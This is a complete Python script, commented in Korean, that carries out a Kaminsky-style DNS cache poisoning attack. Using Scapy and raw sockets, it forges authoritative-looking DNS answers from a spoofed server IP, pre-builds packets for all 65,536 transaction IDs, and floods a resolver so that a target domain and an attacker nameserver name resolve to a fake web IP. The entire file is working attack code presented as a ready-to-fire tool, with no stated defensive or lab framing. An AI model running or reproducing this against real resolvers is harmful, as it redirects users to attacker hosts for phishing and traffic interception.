#!/usr/bin/env python3
from scapy.all import *
import os
import sys
import time
import socket  


# 로우소켓 방식
# === [ Configuration ] ===
# (기존 설정값 동일)
def require_env(name):
    value = os.getenv(name)
    if not value:
        raise SystemExit(f"[!] Missing required environment variable: {name}")
    return value

RESOLVER_IP = require_env("RESOLVER_IP")
AUTH_SERVER_IP = require_env("AUTH_IP")
TARGET_DOMAIN = require_env("TARGET_DOMAIN")
FAKE_IP = require_env("FAKE_WEB_IP")
TARGET_PORT = int(require_env("RESOLVER_ATTACK_UDP_PORT"))
DNS_PORT = int(require_env("DNS_PORT"))
ATTACK_NS_NAME = require_env("ATTACK_NS_NAME")

def make_packet(txid):
    # (기존 make_packet 함수 내용 동일)
    ip = IP(src=AUTH_SERVER_IP, dst=RESOLVER_IP)
    udp = UDP(sport=DNS_PORT, dport=TARGET_PORT)
    dns = DNS(
        id=txid,
        qr=1, aa=1, rd=1,
        qd=DNSQR(qname=TARGET_DOMAIN),
        an=DNSRR(rrname=TARGET_DOMAIN, type='A', rclass='IN', ttl=86400, rdata=FAKE_IP),
        ar=DNSRR(rrname=ATTACK_NS_NAME, type='A', rclass='IN', ttl=86400, rdata=FAKE_IP)
    )
    return ip/udp/dns

def start_attack():
    print(f"[*] Target Resolver: {RESOLVER_IP} (Port: {TARGET_PORT})")
    
    # [Step 1] Pre-loading Phase
    print(f"[*] [Step 1] Loading and Compiling 65536 packets... (Please wait)")
    start_gen = time.time()
    
    # 1. 기존처럼 Scapy 객체 생성
    scapy_pkts = [make_packet(txid) for txid in range(65536)]
    
    # 2. 핵심 마법 : Scapy 객체를 컴퓨터가 바로 쏠 수 있는 순수 '바이트(Bytes)'로 미리 번역
    raw_pkts = [bytes(p) for p in scapy_pkts]
    
    end_gen = time.time()
    print(f"[*] Loading complete! (Time taken: {end_gen - start_gen:.2f}s)")
    
    # 3. 핵심 마법 : Scapy 소켓 대신 파이썬 내장 C레벨 Raw Socket 사용
    # IP 헤더까지 우리가 직접 만들었으므로 IPPROTO_RAW를 사용합니다.
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    
    try:
        while True:
            print("\n" + "="*50)
            print("  [ READY TO FIRE ]")
            print("  - Please ensure resolver cache is cleared.")
            print("  - Press [Enter] to launch the attack.")
            print("  - Press [Ctrl + C] to exit.")
            print("="*50)
            
            input("[▶] Standby... Press Enter to FIRE!")

            print("[🔥] Launching Attack!")
            start_send = time.time()
            
            # 4. 바이트로 변환된 패킷을 OS 네트워크 스택에 다이렉트로 꽂아버림
            for raw_p in raw_pkts:
                s.sendto(raw_p, (RESOLVER_IP, 0))
            
            end_send = time.time()
            elapsed = end_send - start_send
            print(f"\n[+] Attack finished! (Time taken: {elapsed:.4f}s)")
            print(f"[*] Transmission speed: {len(raw_pkts) / elapsed:.2f} pkts/s")
            print("\n[*] Packets are still in memory. Ready for the next round.")
            
    except KeyboardInterrupt:
        print("\n\n[!] Attack interrupted. Exiting program.")
    finally:
        s.close()

if __name__ == "__main__":
    if os.getuid() != 0:
        print("[!] Permission Denied: Please run with 'sudo'.")
        sys.exit(1)
        
    start_attack()
